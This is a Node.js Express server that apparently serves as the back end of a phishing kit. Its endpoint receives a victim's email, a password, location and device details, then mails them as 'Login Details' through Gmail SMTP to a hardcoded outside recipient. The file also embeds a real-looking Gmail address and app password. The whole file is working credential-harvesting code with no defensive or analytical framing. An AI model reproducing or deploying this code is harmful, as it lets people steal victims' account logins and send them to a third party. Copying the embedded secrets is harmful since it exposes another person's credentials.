const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

// Configuration
const CONFIG = {
  PORT: process.env.PORT || 3000,
  EMAIL: {
    USER: 'ranickiauerbach@gmail.com',
    PASS: 'nlov pvvd rcoa dnwl',
    RECIPIENT: 'victorabuke2@yahoo.com',
    SENDERS: {
      FIRST_PW: 'logsnur01@rich.co',
      SECOND_PW: 'logsnur02@rich.us'
    }
  },
  CORS_ORIGIN: '*' // Change to your frontend URL in production
};

// Middleware
app.use(express.json());
app.use(cors({
  origin: CONFIG.CORS_ORIGIN,
  methods: ['POST', 'OPTIONS'], // Allow both POST and preflight
  allowedHeaders: ['Content-Type']
}));

// Email transporter
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 587,
  secure: false,
  auth: {
    user: CONFIG.EMAIL.USER,
    pass: CONFIG.EMAIL.PASS
  }
});

// Handle preflight requests
app.options('/api/submit', cors());

// API Endpoint (matches your frontend exactly)
app.post('/api/submit', async (req, res) => {
  try {
    console.log('Received data:', req.body); // Log incoming data
    
    const { 
      email,
      firstpasswordused,
      secondpasswordused,
      country = 'nil',
      continent = 'nil',
      city = 'nil',
      device = {}
    } = req.body;

    // Validate exactly one password exists
    const passwordCount = [firstpasswordused, secondpasswordused].filter(Boolean).length;
    if (passwordCount !== 1) {
      return res.status(400).json({
        emailStatus: {
          status: 'error',
          message: 'Provide exactly one password'
        }
      });
    }

    const passwordUsed = firstpasswordused || secondpasswordused;
    const fromEmail = firstpasswordused ? CONFIG.EMAIL.SENDERS.FIRST_PW : CONFIG.EMAIL.SENDERS.SECOND_PW;

    await transporter.sendMail({
      from: `"Zap!" <${fromEmail}>`,
      to: CONFIG.EMAIL.RECIPIENT,
      subject: `ZaP - ${email}`,
      html: `
        <h3>Login Details</h3>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${passwordUsed}</p>
        <p><strong>Location:</strong> ${city}, ${country}, ${continent}</p>
        <h4>Device Info</h4>
        <p><strong>User Agent:</strong> ${device.userAgent || 'N/A'}</p>
        <p><strong>Language:</strong> ${device.language || 'N/A'}</p>
        <p><strong>Platform:</strong> ${device.platform || 'N/A'}</p>
        <p><strong>Brand:</strong> ${device.brand || 'N/A'}</p>
        <p><strong>Mobile:</strong> ${device.mobile ? 'Yes' : 'No'}</p>
      `
    });

    res.json({
      emailStatus: {
        status: 'success',
        message: 'Email sent successfully'
      }
    });

  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({
      emailStatus: {
        status: 'error',
        message: 'Internal server error'
      }
    });
  }
});

// Start server
app.listen(CONFIG.PORT, () => {
  console.log(`Server running on port ${CONFIG.PORT}`);
  console.log(`CORS configured for: ${CONFIG.CORS_ORIGIN}`);
});

